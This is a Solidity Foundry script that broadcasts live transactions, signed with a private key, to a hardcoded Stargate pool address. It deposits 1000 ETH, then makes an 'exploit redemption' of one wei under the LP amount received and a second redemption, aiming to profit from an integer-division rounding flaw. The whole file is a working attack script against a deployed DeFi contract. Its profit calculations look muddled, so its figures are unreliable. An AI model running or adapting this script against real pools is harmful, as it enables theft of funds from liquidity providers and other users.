// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IStargatePool {
    function deposit(address _receiver, uint256 _amountLD) external payable returns (uint256);
    function redeem(uint256 _amountLD, address _receiver) external returns (uint256);
    function lpToken() external view returns (address);
    function sharedDecimals() external view returns (uint8);
}

contract StargateIntegerDivisionTest is Script {
    address constant STARGATE_POOL = 0xA45B5130f36CDcA45667738e2a258AB09f4A5f7F;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(privateKey);
        vm.startBroadcast(privateKey);

        // Setup
        IStargatePool stargatePool = IStargatePool(STARGATE_POOL);
        IERC20 lpToken = IERC20(stargatePool.lpToken());

        // Record starting state
        uint256 initialETH = address(deployer).balance;
        console.log("Initial ETH balance:", initialETH);

        // Calculate convert rate
        uint8 sharedDecimals = stargatePool.sharedDecimals();
        uint256 convertRate = 10**(18 - sharedDecimals); // 10^12
        console.log("Convert rate:", convertRate);

        // STEP 1: DEPOSIT ETH
        uint256 depositAmount = 1000 ether; // 1000 ETH Deposit
        console.log("Deposit amount:", depositAmount);
        uint256 gasUsedDeposit = gasleft(); // Gas before

        uint256 lpReceived = stargatePool.deposit{value: depositAmount}(deployer, depositAmount);
        console.log("LP tokens received:", lpReceived);
        gasUsedDeposit = gasUsedDeposit - gasleft(); // Gas after

        // STEP 2: EXECUTE EXPLOIT REDEMPTION
        uint256 redemptionAmount = lpReceived - 1; // One wei under received amount
        console.log("Redemption amount:", redemptionAmount);

        lpToken.approve(STARGATE_POOL, redemptionAmount);
        uint256 gasUsedRedeem = gasleft(); // Gas before
        uint256 ethReceived1 = stargatePool.redeem(redemptionAmount, deployer);
        console.log("First redemption received:", ethReceived1);
        gasUsedRedeem = gasUsedRedeem - gasleft();

        // STEP 3: CHECK REMAINING LP TOKENS
        uint256 remainingLP = lpToken.balanceOf(deployer);
        console.log("Remaining LP tokens:", remainingLP);

        // STEP 4: REDEEM REMAINING LP TOKENS
        lpToken.approve(STARGATE_POOL, remainingLP);
        uint256 gasUsedRedeem2 = gasleft();
        uint256 ethReceived2 = stargatePool.redeem(remainingLP, deployer);
        console.log("Second redemption received:", ethReceived2);
        gasUsedRedeem2 = gasUsedRedeem2 - gasleft();

        vm.stopBroadcast(); // Stop broadcast *before* final balance check

        // STEP 5: CHECK FINAL BALANCE *AFTER* BROADCAST
        uint256 finalETH = address(deployer).balance;
        console.log("Final ETH balance:", finalETH);


        // STEP 6: PROFIT ANALYSIS (Accurate Calculation)
        // Net Profit =  Final Balance - (Initial Balance - Deposit Amount)
        int256 netProfit = int256(finalETH) - (int256(initialETH) - int256(depositAmount));
        console.log("Net profit (wei):", netProfit);

        //Informational:
        uint256 totalGasUsed = gasUsedDeposit + gasUsedRedeem + gasUsedRedeem2;
        console.log("Total gas used:", totalGasUsed);
        console.log("Profit before gas (wei):", ethReceived2 - 1);
        console.log("Gas price:", tx.gasprice); //Gets the gas price AFTER the broadcast
        console.log("Gas cost:", tx.gasprice * totalGasUsed);
    }
}